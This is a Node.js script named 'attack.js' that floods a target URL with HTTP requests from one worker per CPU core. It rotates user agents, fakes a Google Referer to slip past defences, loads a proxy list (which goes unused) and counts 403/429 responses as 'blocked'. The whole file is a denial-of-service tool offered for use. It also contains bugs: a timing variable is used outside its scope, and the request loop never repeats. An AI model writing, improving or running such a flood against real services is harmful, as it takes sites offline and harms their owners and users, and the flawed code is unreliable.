const cluster = require('cluster');
const os = require('os');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const fs = require('fs');
const readline = require('readline');

const [, , target, durationSec] = process.argv;

if (!target || !durationSec) {
  console.log('Usage: node attack.js <target> <duration_seconds>');
  process.exit(1);
}

const duration = parseInt(durationSec) * 1000;
const warmup = 5000;
const endTime = Date.now() + duration + warmup;

// Tracking requests and status
let peakRps = 0; // Peak RPS
let totalRequests = 0;
let successRequests = 0;
let blockedRequests = 0;

const proxyList = readFileLines('proxy.txt');
const userAgentList = readFileLines('ua.txt');

// Rotate proxies and user agents
function readFileLines(fileName) {
  if (!fs.existsSync(fileName)) {
    console.error(`Error: ${fileName} not found.`);
    process.exit(1);
  }
  return fs.readFileSync(fileName, 'utf-8').split('\n').filter(line => line.trim() !== '');
}

function proxyRotate() {
  return proxyList[Math.floor(Math.random() * proxyList.length)];
}

function generateHeaders() {
  return {
    'User-Agent': userAgentList[Math.floor(Math.random() * userAgentList.length)],
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Referer': 'https://google.com',
  };
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function logStats() {
  const elapsedTime = Math.max((Date.now() - startTime) / 1000, 1);
  const rps = totalRequests / elapsedTime;
  peakRps = Math.max(peakRps, rps);

  // Log every 5 seconds
  console.clear();
  console.log(`TARGET: ${target}`);
  console.log('===========');
  console.log(`TOTAL SENT: ${totalRequests}`);
  console.log(`SUCCES: ${successRequests}`);
  console.log(`BLOCKED: ${blockedRequests}`);
  console.log('===========');
  console.log(`REMAINING: ${((endTime - Date.now()) / 1000).toFixed(0)}s`);
}

if (cluster.isMaster) {
  const cpuCount = os.cpus().length;
  console.clear();
  console.log(`Starting ${cpuCount} workers... (warmup ${warmup / 1000}s)`);

  for (let i = 0; i < cpuCount; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} exited`);
  });

  setTimeout(() => {
    console.clear();
    console.log(`\nTest done. Killing workers...`);
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
  }, duration + warmup + 1000);

} else {
  const url = new URL(target);
  const isHttps = url.protocol === 'https:';

  const agent = isHttps
    ? new https.Agent({ keepAlive: true, maxSockets: Infinity })
    : new http.Agent({ keepAlive: true, maxSockets: Infinity });

  const client = isHttps ? https : http;

  // Initialize startTime for the worker
  const startTime = Date.now();

  // Request loop for flooding the target
  function requestLoop() {
    if (Date.now() > endTime) return;

    const headers = generateHeaders();
    const req = client.get(target, { agent, headers }, (res) => {
      res.on('data', () => {});
      res.on('end', () => {
        totalRequests++;
        if (res.statusCode === 200) {
          successRequests++;
        } else if (res.statusCode === 403 || res.statusCode === 429) {
          blockedRequests++;
        }
        logStats(); // Update stats after every request
      });
    });

    req.on('error', (e) => {
      totalRequests++;
      console.error(`Error: ${e.message}`);
      logStats(); // Update stats after an error
    });
  }

  // Start requests after warmup
  setTimeout(() => {
    for (let i = 0; i < 100; i++) {
      requestLoop();
    }
  }, warmup);

  // Final summary log
  setTimeout(() => {
    console.clear();
    console.log(`TARGET: ${target}`);
    console.log('===========');
    console.log(`TOTAL SENT: ${totalRequests}`);
    console.log(`SUCCES: ${successRequests}`);
    console.log(`BLOCKED: ${blockedRequests}`);
    console.log('===========');
    console.log(`Peak RPS: ${peakRps.toFixed(2)}`);
    process.exit();
  }, duration + warmup + 500);
}
